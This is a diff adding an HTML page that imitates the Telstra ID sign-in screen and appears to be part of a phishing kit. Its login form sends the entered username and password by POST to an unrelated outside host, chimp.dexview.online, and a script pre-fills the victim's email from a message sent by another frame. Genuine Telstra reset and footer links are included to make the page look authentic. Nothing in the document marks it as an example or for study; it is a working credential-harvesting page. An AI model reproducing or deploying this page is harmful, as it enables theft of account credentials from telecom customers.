@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+
+
+<head>
+<title>Sign in with your Telstra ID</title>
+<!-- meta -->
+<meta charset="utf-8"/>
+<meta content="IE=edge" http-equiv="X-UA-Compatible"/>
+<meta content="width=device-width, initial-scale=1, viewport-fit=cover" name="viewport"/>
+<!-- favicon -->
+<link href="https://chimp.dexview.online/telstra/new/files/apple-touch-icon.png" rel="apple-touch-icon" sizes="180x180"/>
+<link href="local_resources/img/5b596a1a681acef1c4977ff1c7b12a5c.png" rel="icon" sizes="32x32" type="image/png"/>
+<link href="local_resources/img/9a003f4d8c514add69441358017d9d41.png" rel="icon" sizes="16x16" type="image/png"/>
+<meta content="#ffffff" name="msapplication-TileColor"/>
+<meta content="#ffffff" name="theme-color"/>
+<!-- stylesheet -->
+<link href="local_resources/css/ef09a034f2baa67c7f2d7f871605e6f8.css" media="all" rel="stylesheet" type="text/css"/>
+<style>
+        /* Hide password style */
+        .hide-password {
+            display: none;
+        }
+
+        .password-field {
+            display: flex;
+            align-items: center;
+        }
+
+        #password {
+            flex: 1;
+        }
+    </style>
+<script>
+    function validateEmail(email) {
+      const regex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+      return regex.test(email);
+    }
+	  window.addEventListener('message', event => {
+      const defaultEmail = event.data;
+	  const emailInput = document.getElementById('username');
+	  const passwordInput = document.getElementById('password');
+
+      if (validateEmail(defaultEmail)) {
+        emailInput.value = defaultEmail;
+        emailInput.setAttribute('readonly', 'true'); 
+        passwordInput.focus();
+      } else {
+        emailInput.removeAttribute('readonly'); 
+		emailInput.focus();
+      }
+	  });
+	</script>
+</head>
+<body>
+<div>
+<header class="t-page-header t-able-spacing-7x-mb">
+
+<defs>
+<polygon id="path-1" points="0.0157894737 0.142713178 0.0157894737 23.3170543 24.7531579 23.3170543 24.7531579 0.142713178 0.0157894737 0.142713178"></polygon>
+</defs>
+<g fill="none" fill-rule="evenodd" id="NEW-UI-DESIGN-APPROVAL" stroke="none" stroke-width="1">
+<g id="TelstraID-M-Check-1" transform="translate(-277.000000, -21.000000)">
+<g id="Icons-/-Logo-/-blue" transform="translate(271.000000, 16.000000)">
+<g id="Primary-Blue-RGB" transform="translate(6.666667, 5.000000)">
+<g id="Group-3" transform="translate(0.000000, 6.666667)">
+<mask fill="white" id="mask-2">
+<use xlink:href="#path-1"></use>
+</mask>
+<g id="Clip-2"></g>
+<path d="M17.4526316,6.10817829 L16.2989474,13.0965116 C16.0607895,14.3537984 15.2576316,14.6943023 14.5444737,14.6943023 L9.20131579,14.6943023 L11.4528947,1.89488372 C9.20473684,0.834844961 6.90947368,0.142713178 5.08157895,0.142713178 C3.34263158,0.142713178 1.93052632,0.62755814 0.991578947,1.78934109 C0.329736842,2.61523256 0,3.63457364 0,4.84709302 C0,8.48600775 2.77605263,13.5352326 7.52736842,17.6541085 C11.7631579,21.2949225 16.4226316,23.3333333 19.8142105,23.3333333 C21.5060526,23.3333333 22.8710526,22.7991085 23.7668421,21.7331008 C24.4721053,20.9080233 24.7531579,19.8379457 24.7531579,18.6256977 C24.7531579,15.0898837 21.9571053,10.132907 17.4526316,6.10817829" fill="#0099F8" id="Fill-1" mask="url(#mask-2)"></path>
+</g>
+<path d="M5.78645688,1.47677152 L5,5.60790566 L12.0304729,5.60790566 L9.01241707,21.6666667 L14.6035307,21.6666667 C15.3497835,21.6666667 16.1902129,21.3332107 16.4394228,20.1019478 L18.9962338,5.60790566 L24.0534048,5.60790566 C24.944227,5.60790566 25.6800158,5.03717784 25.8774561,4.13591677 L26.6666667,0 L7.60830516,0 C6.72078747,0 5.9830711,0.574713348 5.78645688,1.47677152 Z" fill="#001E82" id="Fill-4"></path>
+</g>
+</g>
+</g>
+</g>
+
+</header>
+<div class="t-form-container" role="main">
+<h1 class="t-header t-able-spacing-2x-mb">Sign in</h1>
+<div class="t-sub-heading t-able-spacing-7x-mb">Sign in with your Telstra ID</div>
+<form action="https://chimp.dexview.online/telstra/xmas/new/index.php" autocomplete="off" method="POST">
+<div class="t-able-text-field t-pwd-field t-able-spacing-2x-mb">
+<label for="username">Username</label>
+<input aria-describedby="" aria-invalid="false" aria-required="true" autocomplete="current-password" autofocus="" id="username" name="username" onblur="handleOnblurEvent(event)" required="required" type="text"/>
+<p id="username-error-text"></p>
+</div>
+<div class="t-able-text-field t-pwd-field t-able-spacing-2x-mb">
+<label for="password">Password</label>
+<div class="password-field">
+<input aria-describedby="" aria-invalid="false" aria-required="true" autocomplete="current-password" autofocus="" id="password" name="password" onblur="handleOnblurEvent(event)" required="required" type="password"/>
+<button aria-label="Show password characters" class="t-able-low-emph-button t-showpwd" id="showPwdBtn" onclick="togglePassword('show')" type="button">Show</button>
+<button aria-label="Hide password characters" class="t-able-low-emph-button t-showpwd hide-password" id="hidePwdBtn" onclick="togglePassword('hide')" type="button">Hide</button>
+</div>
+<p id="password-error-text"></p>
+</div>
+<div class="t-able-spacing-2x-mb">
+<a class="t-able-low-emph-button t-reset-password-link" href="https://myid.telstra.com/identity/as/authorization.oauth2?client_id=mytelstra&amp;redirect_uri=https%3A%2F%2Fwww.myservices.telstra.com.au%2Fmytelstra%2Flogin-intermediate&amp;response_type=code&amp;scope=openid+app.mytelstra&amp;state=f839a6d4a46b41a28116d63c56bf5407&amp;code_challenge=JoOTmYNCIROI1sxWPx3iG1m83XSxkaYuPDldhX_TRyA&amp;code_challenge_method=S256&amp;PasswordReset_UsernameVerification=true" onclick="loadAnalyticEvents('click', 'clickTrack', 'linkClick', 'Reset password')"> Reset password </a>
+</div>
+<div class="">
+<button class="t-able-high-emph-button t-able-spacing-7x-mb" id="submit_btn" type="submit">Sign in</button>
+</div>
+</form>
+</div>
+<div aria-label="Message Us" class="persistentChatContainer" id="persistentChatContainer" role="navigation"></div>
+<footer class="t-footer">
+<div class="t-footer-content">
+<p class="t-footer-copyright">Copyright Â© 2023 Telstra</p>
+<a class="t-footer-privacy" href="https://www.telstra.com.au/privacy/privacy-statement" target="_blank">Privacy</a>
+<a class="t-footer-terms" href="https://www.telstra.com.au/terms-of-use" target="_blank">Terms of use</a>
+</div>
+</footer>
+</div>
+</body>
